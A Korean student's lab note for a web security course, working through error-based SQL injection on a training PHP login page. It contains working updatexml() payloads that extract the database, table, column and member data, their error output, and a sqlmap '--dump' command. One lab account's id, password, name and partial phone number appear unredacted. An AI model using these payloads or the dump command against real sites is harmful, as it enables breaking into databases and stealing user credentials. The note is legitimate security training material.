---
type: lab
topic: web-security
source: 5-20_웹보안.pdf
source_pages:
  - 122
  - 125
  - 126
  - 127
  - 128
  - 129
  - 130
  - 131
status: active
created: 2026-05-28
reviewed: 2026-07-08
tags:
  - 🏷️과목/웹보안
  - 🏷️주제/SQL
  - 🏷️주제/SQLInjection
  - 🏷️상태/active
---

# SQL Injection Error 기반 정보 추출 실습

source: [[40_자료/강의 자료/5-20_웹보안.pdf|5-20 웹보안]], p.122, p.125-131.

## 1. 실습 요약

### 실습 개요

한 줄 요약: **취약한 로그인 SQL에 `updatexml()` 기반 payload를 넣어 MySQL 에러를 의도적으로 발생시키고, 에러 메시지를 통해 Database명, Table명, Column명, 일부 Data가 노출되는지 확인한 실습이다.**

이 실습은 인증 우회가 목적이 아니다. 로그인 성공이 아니라 **DB가 에러를 내게 만들고, 그 에러 메시지가 내부 정보를 얼마나 노출하는지**를 보는 단계다.

| 항목 | 내용 |
|---|---|
| PDF 범위 | p.122 Error 기반 정보 노출, p.125-131 Database명 -> Table명 -> Column명 -> Data |
| 실습 대상 | `care/member/loginModel.php` |
| 사전 조건 | PHP 에러 출력 활성화 |
| 확인한 정보 | Database명 `care`, Table명 `center`, `login_fail`, `member`, `member` 일부 Column/Data |
| 연결 개념 노트 | [[10_학습 노트/시스템보안/웹보안/SQL Injection Error와 UNION 기반 정보 추출과 Schema 파악|SQL Injection Error와 UNION 기반 정보 추출과 Schema 파악]] |
| 현재 상태 | 실습 흐름 정리 완료. 스크린샷은 선택 보강 |

---

### DB 구조 리마인드

이 실습은 처음에는 Database명을 확인하는 단계였지만, 이후 Table명, Column명, 일부 Data 확인까지 이어졌다.

```text
Database: care
-> Table: center, login_fail, member
-> Column: member 테이블의 일부 컬럼 확인
-> Value: member 테이블의 일부 값 확인
```

정확한 구조는 다음 순서로 좁혀간다.

```text
Database
-> Table
-> Column
-> Value
```

이번 실습에서 중요한 점은 “한 번에 다 긁어왔다”가 아니라, **에러 메시지 길이 제한 때문에 짧은 정보는 보이고 긴 정보는 잘릴 수 있다**는 것이다.

---

### 인증 우회 실습과 다른 점

이전 [[10_학습 노트/시스템보안/웹보안/SQL Injection 인증 우회 실습|SQL Injection 인증 우회 실습]]은 DB가 레코드를 반환하게 만들어 로그인 세션을 얻는 흐름이었다.

이번 실습은 목표가 다르다.

```text
인증 우회:
DB가 row를 반환하게 만들어 로그인 성공 처리

Error 기반 정보 노출:
DB가 에러를 내게 만들고, 에러 메시지에서 내부 정보 확인
```

즉 이번 실습에서 중요한 결과는 “로그인 성공”이 아니라 아래 문자열이다.

```text
XPATH syntax error: '[DB]=care'
```

---

### 강사님이 DB에 직접 접속한 의미

강사님이 VSC에서 DB에 직접 접속해 `information_schema` 관련 `SELECT`를 실행하는 것은 공격 경로 자체라기보다, **SQLi로 알아내려는 DB 내부 구조를 먼저 눈으로 보여주는 설명 단계**에 가깝다.

| 관점 | 의미 |
|---|---|
| 강사님 직접 DB 조회 | 정답지/내부 구조 확인. `care` DB 안에 어떤 Table, Column이 있는지 직접 보여줌 |
| SQL Injection 실습 | 웹 로그인 요청에 payload를 넣어, 애플리케이션 경유로 같은 정보를 조금씩 노출시키는 흐름 |

따라서 둘은 모순이 아니다. 직접 DB 조회는 “우리가 캐내려는 대상이 실제로 DB 안에 어떻게 생겼는지”를 보여주는 기준선이고, SQLi payload는 그 정보를 웹 취약점을 통해 밖으로 끌어내는 방법이다.

---

### p.128 사진의 의미 - 메타데이터를 표로 같이 보기

PDF p.128 사진은 `information_schema.columns`를 직접 조회해서 `column_name`, `table_name`, `table_schema`를 한 결과표에서 같이 보는 장면이다.

즉 이 사진의 핵심은 “모든 값을 한 방에 긁는다”가 아니라, **하나의 Column 메타데이터 row 안에 컬럼명, 테이블명, DB명이 같이 들어 있다**는 점이다.

직접 DB에 접속하면 이런 식으로 볼 수 있다.

```sql
SELECT column_name, table_name, table_schema
FROM information_schema.columns
WHERE table_schema = database();
```

이 경우 DB는 표 형태로 여러 row와 여러 column을 그대로 보여준다.

```text
column_name | table_name | table_schema
------------|------------|-------------
num         | center     | care
id          | center     | care
...
pw          | member     | care
```

하지만 지금 실습의 `updatexml()` 방식은 결과표를 그대로 보여주는 통로가 아니다. 에러 메시지 한 줄 안에 값을 끼워 넣는 방식이다. 그래서 p.128 같은 표를 그대로 출력하려면 안 되고, 한 row를 문자열로 바꿔서 봐야 한다.

예:

```sql
' or updatexml(1, concat('[COL]=', (SELECT concat(column_name,0x3a,table_name,0x3a,table_schema) FROM information_schema.columns WHERE table_schema=database() LIMIT 0,1)), 1) --<space>
```

해석:

```text
column_name : table_name : table_schema
```

여기서도 여러 row를 한꺼번에 보려면 `group_concat()`을 쓸 수는 있지만, 에러 메시지 길이 제한 때문에 중간에 잘릴 수 있다. 그래서 p.128의 직접 DB 조회 화면과, 우리가 웹 취약점을 통해 보는 에러 기반 출력은 구분해야 한다.

---

## 2. 실습 환경과 전제

### 에러 출력 활성화

DB 내부 정보가 에러 메시지에 섞여 나오는지 확인하려면, PHP가 에러를 화면에 출력해야 한다.

실습 중 확인/수정한 파일:

```bash
sudo cat -n /etc/php/8.5/apache2/php.ini | grep -i "display_err*"
sudo vi -n /etc/php/8.5/apache2/php.ini
```

수정한 설정:

```ini
display_errors = On
```

이후 Apache를 재시작했다.

> [!warning]
> `display_errors = On`은 실습 관찰을 쉽게 하기 위한 설정이다. 실제 서비스에서는 내부 경로, SQL 에러, DB 정보가 사용자에게 노출될 수 있으므로 위험하다.

---

## 3. 수동 정보 추출 흐름

### 사용한 payload

처음에는 PDF 또는 받아쓰기 기준으로 아래처럼 입력했지만 원하는 결과가 나오지 않았다.

```text
' or updatexml(1, concat('[DB]=', database()), 1) –
```

실제로 동작한 형태:

```text
' or updatexml(1, concat('[DB]=', database()), 1) --<space>
```

여기서 `<space>`는 실제 공백 한 칸을 뜻한다.

중요한 차이:

| 형태 | 의미 |
|---|---|
| `–` | 일반 하이픈 `-`가 아니라 다른 dash 문자처럼 보일 수 있음 |
| `--<space>` | MySQL에서 주석으로 처리될 수 있는 형태 |

이번에도 핵심은 뒤쪽 비밀번호 조건을 주석으로 날리는 것이다. 주석 처리가 제대로 되지 않으면 원래 SQL 뒤쪽이 살아남아 payload가 의도대로 동작하지 않을 수 있다.

---

### payload가 하는 일

payload:

```sql
' or updatexml(1, concat('[DB]=', database()), 1) --<space>
```

구성 요소:

| 조각 | 역할 |
|---|---|
| `'` | 원래 문자열 따옴표를 닫음 |
| `or` | 원래 조건 뒤에 새 조건을 붙임 |
| `database()` | 현재 선택된 Database 이름을 반환 |
| `concat('[DB]=', database())` | 결과를 `[DB]=care`처럼 보기 쉬운 문자열로 만듦 |
| `updatexml(...)` | MySQL XML 함수. 잘못된 XPath 표현을 넣어 에러를 유도 |
| `--<space>` | 뒤쪽 SQL 조건을 주석 처리 |

초보자식으로 보면 이렇다.

```text
1. database()로 현재 DB 이름을 꺼낸다.
2. concat()으로 [DB]=care 형태의 문자열을 만든다.
3. updatexml()에 그 문자열을 넣어 일부러 에러를 만든다.
4. MySQL 에러 메시지에 [DB]=care가 섞여 나온다.
```
### 관찰한 결과

실습에서 확인한 에러:

```text
Fatal error: Uncaught mysqli_sql_exception: XPATH syntax error: '[DB]=care' in /var/www/care/member/loginModel.php:26 Stack trace: #0 /var/www/care/member/loginModel.php(26): mysqli_query() #1 {main} thrown in /var/www/care/member/loginModel.php on line 26
```

여기서 핵심은 전체 stack trace가 아니라 이 부분이다.

```text
XPATH syntax error: '[DB]=care'
```

해석:

| 관찰한 문자열 | 의미 |
|---|---|
| `XPATH syntax error` | `updatexml()` 실행 중 XPath 문법 에러가 발생 |
| `[DB]=care` | `database()` 결과가 에러 메시지 안에 노출됨 |
| `/var/www/care/member/loginModel.php:26` | 에러가 발생한 PHP 파일과 라인 정보도 같이 노출됨 |

이번 실습에서 얻은 정보:

```text
현재 Database명 = care
```

---

### Table명 추출로 넘어가며 알게 된 점

DB명은 `database()` 함수 하나로 바로 가져올 수 있었다.

```sql
database()
```

하지만 Table명은 `tables()` 같은 함수로 바로 가져오는 것이 아니다.

Table명은 MySQL의 메타데이터 테이블인 `information_schema.tables`에서 조회해야 한다.

```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema=database()
```

뜻:

```text
현재 DB(database()) 안에 있는 테이블 이름들을 가져와라.
```

여기서 중요한 차이가 생긴다.

| 대상 | 가져오는 방식 | 반환 개수 |
|---|---|---|
| 현재 DB명 | `database()` | 보통 값 1개 |
| Table명 목록 | `information_schema.tables` 조회 | 여러 row 가능 |

그래서 `concat()` 안에 Table명 조회를 넣을 때는 조심해야 한다.

### 실패한 Table명 추출 시도

처음 떠올린 형태:

```text
' or updatexml(1, concat('[T]=', tables()), 1) --<space>
```

문제:

```text
tables()는 MySQL 함수가 아니다.
```

그 다음 시도한 형태:

```text
' or updatexml(1, concat('[T]=', (SELECT table_name FROM information_schema.tables WHERE table_schema=database())), 1) --<space>
```

관찰한 에러:

```text
Subquery returns more than 1 row
```

해석:

`concat('[T]=', (...))` 안에는 값 하나만 들어가야 한다. 그런데 `SELECT table_name FROM information_schema.tables WHERE table_schema=database()`는 현재 DB 안의 테이블명을 여러 row로 반환할 수 있다.

예를 들면 이런 식이다.

```text
member
center
login_fail
...
```

DB 입장에서는 `concat()` 안에 여러 줄이 들어온 셈이라 에러가 난다.

### Table명을 하나씩 뽑는 방식

한 번에 값 하나만 넣으려면 `LIMIT`으로 row 하나를 골라야 한다.

첫 번째 Table명:

```text
' or updatexml(1, concat('[T]=', (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)), 1) --<space>
```

두 번째 Table명:

```text
' or updatexml(1, concat('[T]=', (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)), 1) --<space>
```

세 번째 Table명:

```text
' or updatexml(1, concat('[T]=', (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1)), 1) --<space>
```

정리:

```text
LIMIT 0,1 -> 첫 번째 row 하나
LIMIT 1,1 -> 두 번째 row 하나
LIMIT 2,1 -> 세 번째 row 하나
```

수업 실습 관점에서는 이 방식이 귀찮아도 원리를 가장 잘 보여준다.

---

### 날먹 후보 - group_concat()

`group_concat()`은 여러 row를 하나의 문자열로 합쳐준다. 그래서 `concat('[T]=', (...))` 안에 “값 하나”처럼 넣을 수 있다.

이번 실습에서는 `group_concat()`을 이용해 다음 순서로 한 번에 뽑아보려고 했다.

```text
1. Table명 목록
2. 특정 Table의 Column명 목록
3. 특정 Table의 실제 Data 일부
```

결론부터 말하면 **부분 성공**이다.

| 단계 | 결과 | 판단 |
|---|---|---|
| Table명 | `center,login_fail,member` | 성공 |
| `member` Column명 | `num,id,pw,name,mobile,addres` | 부분 성공. `address`가 잘림 |
| `member` Data | `4:unoh:123:장운호:0103012` | 부분 성공. 뒤쪽 데이터가 잘림 |

즉 `group_concat()` 자체는 동작했다. 다만 `updatexml()` 에러 메시지에 표시되는 문자열 길이가 짧아서 Column명과 Data가 중간에 잘렸다.

#### 1. Table명 한 번에 보기

```sql
' or updatexml(1, concat('[T]=', (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())), 1) --<space>
```

결과:

```text
Fatal error: Uncaught mysqli_sql_exception: XPATH syntax error: '[T]=center,login_fail,member' in /var/www/care/member/loginModel.php:26 Stack trace: #0 /var/www/care/member/loginModel.php(26): mysqli_query() #1 {main} thrown in /var/www/care/member/loginModel.php on line 26
```

해석:

```text
care DB 안의 Table명:
- center
- login_fail
- member
```

Table명은 문자열이 짧아서 한 번에 확인됐다.

#### 2. 특정 테이블 Column명 보기

예: `member`

```sql
' or updatexml(1, concat('[C]=', (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='member')), 1) --<space>
```

결과:

```text
Fatal error: Uncaught mysqli_sql_exception: XPATH syntax error: '[C]=num,id,pw,name,mobile,addres' in /var/www/care/member/loginModel.php:26 Stack trace: #0 /var/www/care/member/loginModel.php(26): mysqli_query() #1 {main} thrown in /var/www/care/member/loginModel.php on line 26
```

해석:

```text
member Table의 Column명 일부:
num
id
pw
name
mobile
addres...
```

`address`가 `addres`에서 끊긴 것으로 보인다. 즉 Column명 추출은 성공했지만, 에러 메시지 길이 때문에 전체가 보이지 않았다.

#### 3. 특정 테이블 Data 보기

예: `member`의 `num`,`id`, `pw`, `name`, `mobile`,`address`

```sql
' or updatexml(1, concat('[D]=', (SELECT group_concat(num,0x3a,id,0x3a,pw,0x3a,name,0x3a,mobile,0x3a,address) FROM member)), 1) --<space>
```

`0x3a`는 `:` 문자야.

결과:

```text
Fatal error: Uncaught mysqli_sql_exception: XPATH syntax error: '[D]=4:unoh:123:장운호:0103012' in /var/www/care/member/loginModel.php:26 Stack trace: #0 /var/www/care/member/loginModel.php(26): mysqli_query() #1 {main} thrown in /var/www/care/member/loginModel.php on line 26
```

해석:

```text
member Table의 Data 일부:
num = 4
id = unoh
pw = 123
name = 장운호
mobile = 0103012...
```

이것도 실제 값이 노출된 것은 맞다. 다만 뒤쪽 `mobile`, `address` 값은 잘렸다.

따라서 “완전 실패”가 아니라 **한 방 추출은 부분 성공, 전체 추출은 길이 제한 때문에 실패**로 보는 게 정확하다.

---

### group_concat() 이후 다시 LIMIT으로 돌아가는 이유

짧은 값은 `group_concat()`으로 한 번에 볼 수 있다.

하지만 Column명이나 Data처럼 문자열이 길어지면 에러 메시지에서 잘릴 수 있다. 이때는 다시 `LIMIT`으로 하나씩 나눠 보는 편이 안정적이다.

예: 첫 번째 사용자 한 명의 `id:pw:name` 확인

```sql
' or updatexml(1, concat('[D]=', (SELECT concat(id,0x3a,pw,0x3a,name) FROM member LIMIT 0,1)), 1) --<space>
```

다음 row:

```sql
' or updatexml(1, concat('[D]=', (SELECT concat(id,0x3a,pw,0x3a,name) FROM member LIMIT 1,1)), 1) --<space>
```

정리:

```text
DB명: database()
테이블명: information_schema.tables
컬럼명: information_schema.columns
데이터: 실제 table에서 SELECT
여러 개 한 번에: group_concat()
안 되거나 잘리면: LIMIT n,1
```

진짜 날먹은 SQLi가 아니라 DB에 직접 접속해서 아래처럼 조회하는 것이다.

```sql
SELECT * FROM member;
```

하지만 SQLi 실습의 목적은 “DB에 직접 접속해서 보는 것”이 아니라, 웹 애플리케이션의 취약한 SQL 실행 경로를 통해 같은 정보를 밖으로 끌어낼 수 있음을 이해하는 것이다.

---

## 4. 보안 의미

### 왜 이게 위험한가

에러 메시지는 원래 개발자가 문제를 찾기 위한 정보다.

하지만 공격자가 볼 수 있는 화면에 그대로 출력되면 다음 정보가 노출될 수 있다.

- 현재 Database명
- PHP 파일 경로
- 취약한 파일 위치
- SQL 실행 라인
- DBMS 함수 실행 결과

이번 실습에서는 Database명에서 시작해 Table명, Column명, 일부 Data까지 노출될 수 있음을 확인했다. 특히 `group_concat()`을 쓰면 짧은 목록은 한 번에 볼 수 있지만, 에러 메시지 길이 제한 때문에 긴 Column/Data는 중간에 잘릴 수 있다.

---
## 5. 자동화 재검증

### 자동화 도구로 재검증 - sqlmap

앞의 실습은 `updatexml()` payload를 직접 넣어 Error-based SQL Injection으로 DB명, Table명, Column명, 일부 Data가 노출되는지 확인한 것이다.

이후 같은 취약점을 `sqlmap`으로 재검증했다. 이 섹션의 목적은 `sqlmap` 사용법을 길게 정리하는 것이 아니라, **수동으로 확인한 취약점과 정보 추출 흐름이 자동화 도구에서도 동일하게 확인되는지**를 증거로 남기는 것이다.

> [!warning]
> 이 기록은 허가된 내부 실습 환경에서 수행한 결과다.  
> 실제 서비스나 허가받지 않은 대상에 대해 같은 방식으로 실행하면 불법이 될 수 있다.  
> `--dump` 결과에는 계정, 비밀번호, 이메일, 전화번호, 이름 같은 민감 정보가 포함될 수 있으므로 노트에는 원본 값을 그대로 남기지 않는다.

#### 실행 대상

```text
Target: http://172.16.0.150:8080/member/loginModel.php
Method: POST
Parameter: id, pw
Test data: id=test, pw=test
Tool: sqlmap 1.10.2
```

실행 흐름은 다음 순서였다.

```text
1. Injection point 확인
2. Database 목록 확인
3. care Database의 Table 목록 확인
4. member Table 구조와 데이터 노출 가능성 확인
```

---

#### 1. Injection point 확인

기본 요청을 대상으로 `sqlmap`을 실행했을 때, 이전 세션의 탐지 결과가 재사용되며 `id` 파라미터에서 SQL Injection 지점이 확인되었다.

```text
Parameter: id (POST)

Type: error-based
Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)

Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
```

해석:

| 항목 | 의미 |
|---|---|
| `Parameter: id (POST)` | POST 요청의 `id` 값이 SQL Injection에 영향을 받는 지점 |
| `error-based` | DB 에러 반응을 통해 내부 정보를 노출시키거나 추정할 수 있음 |
| `time-based blind` | 화면에 직접 값이 보이지 않아도 응답 지연으로 조건 참/거짓을 추정할 수 있음 |
| `EXTRACTVALUE` | MySQL XML 함수 기반의 Error-based 기법이 사용됨 |
| `SLEEP` | 시간 지연 기반 Blind SQL Injection 확인에 사용됨 |

`sqlmap`은 대상 환경도 다음처럼 식별했다.

```text
web server operating system: Linux Ubuntu
web application technology: PHP, Apache 2.4.66
back-end DBMS: MySQL >= 5.1
```

수동 실습에서 `updatexml()`과 `information_schema`를 사용한 이유도 이 결과와 연결된다. 대상 DBMS가 MySQL 계열이기 때문이다.

---

#### 2. Database 목록 확인

`--dbs` 옵션으로 Database 목록을 확인했다.

```text
available databases [3]:
[*] care
[*] information_schema
[*] performance_schema
```

해석:

| Database | 의미 |
|---|---|
| `care` | 실습 웹 애플리케이션이 사용하는 실제 서비스 DB로 판단됨 |
| `information_schema` | DB, Table, Column 같은 구조 정보를 담는 MySQL 메타데이터 DB |
| `performance_schema` | MySQL 성능/상태 관련 메타데이터 DB |

여기서 중요한 결과는 `care`라는 Database명을 자동화 도구로도 확인했다는 점이다. 앞에서 수동 payload로 본 `[DB]=care`와 같은 방향의 증거다.

---

#### 3. Table 목록 확인

`care` Database를 대상으로 Table 목록을 확인했다.

```text
Database: care
[3 tables]
+------------+
| member     |
| center     |
| login_fail |
+------------+
```

해석:

| Table | 추정 역할 |
|---|---|
| `member` | 회원 계정 정보 |
| `center` | 게시글 또는 센터 관련 데이터 |
| `login_fail` | 로그인 실패 기록 또는 계정 잠금 관련 데이터 |

이 결과는 수동 실습의 `group_concat(table_name)` 결과와도 맞다.

```text
[T]=center,login_fail,member
```

즉 `information_schema.tables`를 이용한 수동 확인과 `sqlmap --tables` 결과가 서로 같은 구조를 가리킨다.

---

#### 4. `member` Table 구조와 데이터 노출 가능성 확인

`member` Table dump 과정에서 다음 컬럼들이 확인되었다.

```text
num
id
pw
name
mobile
address
email
date
```

이 컬럼 구성은 회원 계정 정보와 개인정보가 같은 테이블에 들어 있음을 보여준다.

원본 dump에는 실제 값이 포함되어 있었으므로, 노트에는 아래처럼 redacted 형태로만 남긴다.

```text
Database: care
Table: member
[4 entries]

+---------+--------+-----+----------------------+------------+--------+----------------+---------+
| id      | pw     | num | email                | date       | name   | mobile         | address |
+---------+--------+-----+----------------------+------------+--------+----------------+---------+
| <user1> | <pw1>  | 7   | <redacted>           | 2026-05-26 | <name> | <redacted>     | <addr>  |
| <user2> | <pw2>  | 4   | <redacted-email>     | 2026-05-21 | <name> | <redacted-tel> | <addr>  |
| <user3> | <pw3>  | 6   | <redacted-email>     | 2026-05-22 | <name> | <redacted-tel> | <addr>  |
| <user4> | <pw4>  | 5   | <redacted>           | 2026-05-22 | <name> | <redacted-tel> | <addr>  |
+---------+--------+-----+----------------------+------------+--------+----------------+---------+
```

핵심은 실제 값 자체가 아니라, **SQL Injection을 통해 회원 테이블의 구조와 민감 데이터가 노출될 수 있다는 점**이다.

---

#### 5. 전체 Table dump로 본 노출 범위 확인

검열본에는 명령 줄이 한글화/검열된 형태로 남아 있었으므로, 아래에는 같은 실행 의도를 표준 옵션명으로 바꾼 재현 형태만 남긴다.

```text
sqlmap -u "<LAB_TARGET_URL>" --data="id=test&pw=test" -D care --dump --risk 3 --level 5
```

이 명령은 `care` Database를 대상으로 dump를 시도한다. 실제 대상 URL, 세션 값, dump된 row 값은 노트에 남기지 않는다.

실행 흐름은 다음 순서로 진행되었다.

```text
1. 대상 URL 연결 확인
2. 이전 세션에 저장된 Injection point 재사용
3. POST id 파라미터에서 SQL Injection 지점 확인
4. Back-end DBMS를 MySQL 계열로 식별
5. care Database의 Table 목록 확인
6. 각 Table의 Column 구조 확인
7. 각 Table의 entry dump 수행
8. dump 결과를 CSV/text 로그 파일로 저장
```

검열본에서 확인된 결과 범위는 다음과 같다.

| Table | 확인된 entry 수 | 확인된 구조 | 의미 |
|---|---:|---|---|
| `center` | 27 | `content`, `date`, `filename`, `hit`, `id`, `num`, `subject` | 게시글, 첨부파일명, 조회수 같은 업무 데이터도 노출 가능 |
| `member` | 4 | `num`, `id`, `pw`, `name`, `mobile`, `address`, `email`, `date` | 회원 계정 정보와 개인정보 컬럼 노출 가능 |
| `login_fail` | 144 | `fail_count`, `id`, `ip`, `locked_count`, `rest_time` | 로그인 실패 횟수, IP, 잠금 상태 같은 보안 운영 데이터 노출 가능 |

즉 `member` Table 하나만 위험한 것이 아니라, 같은 Injection 지점으로 애플리케이션 DB의 여러 업무 Table과 보안 상태 Table까지 함께 노출될 수 있다.

---

#### 수동 실습과 sqlmap 결과의 관계

| 구분 | 수동 실습 | sqlmap 재검증 |
|---|---|---|
| 취약점 확인 | `updatexml()` payload 직접 입력 | `id` 파라미터의 Error-based / Time-based SQLi 탐지 |
| DBMS 추정 | MySQL 함수 사용을 통해 추론 | `MySQL >= 5.1`로 식별 |
| Database명 | `[DB]=care` 에러 메시지 확인 | `--dbs`에서 `care` 확인 |
| Table명 | `group_concat(table_name)`으로 확인 | `--tables`에서 `member`, `center`, `login_fail` 확인 |
| Column/Data | 에러 메시지 길이 제한 때문에 일부만 확인 | `--dump`로 구조와 데이터 노출 가능성 확인 |

정리하면, 수동 실습은 원리를 이해하는 데 좋고, `sqlmap`은 같은 취약점이 실제로 어느 정도까지 자동화되어 확장될 수 있는지 보여준다.

이번 실습의 결론은 다음이다.

```text
1. 로그인 요청의 id 파라미터가 SQL Injection에 취약하다.
2. DBMS는 MySQL 계열이다.
3. Error-based SQL Injection으로 DB명과 Table명을 확인할 수 있다.
4. 에러 메시지 길이 제한 때문에 수동 payload로는 긴 Column/Data가 잘릴 수 있다.
5. 자동화 도구를 사용하면 같은 취약점을 기반으로 Table 구조와 Data 노출 가능성까지 빠르게 확인된다.
```

## 6. 마무리와 보강

### 최종 정리

이 노트는 로그인 성공 여부가 아니라, DB 에러가 사용자 화면으로 노출될 때 내부 구조와 실행 위치 같은 정보가 단계적으로 드러날 수 있음을 정리한 실습 노트다.

수동 확인 흐름과 자동화 도구 재검증은 같은 취약점을 서로 다른 방식으로 확인한 기록으로 두고, 원본 중간 기록은 아래 부록에 보존한다.

### 보강하면 좋은 증거

현재 노트는 명령, payload, 에러 문자열, 관찰 결과를 중심으로 실습 흐름을 닫았다. 아래 증거를 붙이면 재현성과 시각적 이해가 더 좋아진다.

- `php.ini`에서 `display_errors`를 켠 화면 또는 명령 결과
- Apache 재시작 명령
- Paros에서 수정한 실제 Request 본문
- 실패했던 payload와 성공한 payload 비교
- 에러 화면 스크린샷
- `XPATH syntax error: '[DB]=care'`가 보이는 증거

---

## 부록. 원본 중간 기록

> [!note]- raw 기록
> 122페이지부터 시작
>
> `sudo cat -n /etc/php/8.5/apache2/php.ini | grep -i "display_err*"`
>
> `sudo vi -n /etc/php/8.5/apache2/php.ini`
>
> `display_errors On`으로 수정.
>
> 아파치 리스타트.
>
> 내가 지금 125페이지부터 하고 있는 건가?
>
> `' or updatexml(1, concat('[DB]=', database()), 1) –`
>
> 이걸 아이디에 넣고 로그인하면 DB가 오류 메시지에 있어야 하는데 왜 없지.
>
> 아니 PDF가 이상한 거였네.
>
> `' or updatexml(1, concat('[DB]=', database()), 1) -- `
>
> 이거다.
>
> `Fatal error: Uncaught mysqli_sql_exception: XPATH syntax error: '[DB]=care' in /var/www/care/member/loginModel.php:26 Stack trace: #0 /var/www/care/member/loginModel.php(26): mysqli_query() #1 {main} thrown in /var/www/care/member/loginModel.php on line 26`
>
> `'' or updatexml(1, concat('[T]=', (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())), 1) -- `
